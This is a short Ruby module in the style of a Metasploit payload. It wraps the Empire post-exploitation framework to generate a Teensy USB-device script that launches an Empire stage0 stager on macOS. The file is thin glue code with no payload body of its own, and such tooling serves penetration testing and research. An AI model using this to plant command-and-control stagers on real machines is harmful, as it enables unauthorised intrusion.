##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
require 'msf/core/payload/empire_single.rb'

module MetasploitModule

  include Msf::Payload::EmpireSingle

  def initialize(info={})
    super(merge_info(info,
    'Description'=> 'Generates a Teensy Script taht runs a one-liner stage0 launcher for Empire'
    ))
  end

  def stager_generator(empireClient)
    @stagerCode = empireClient.gen_stager(@listener_name, 'osx/teensy')
    return @stagerCode
  end
end
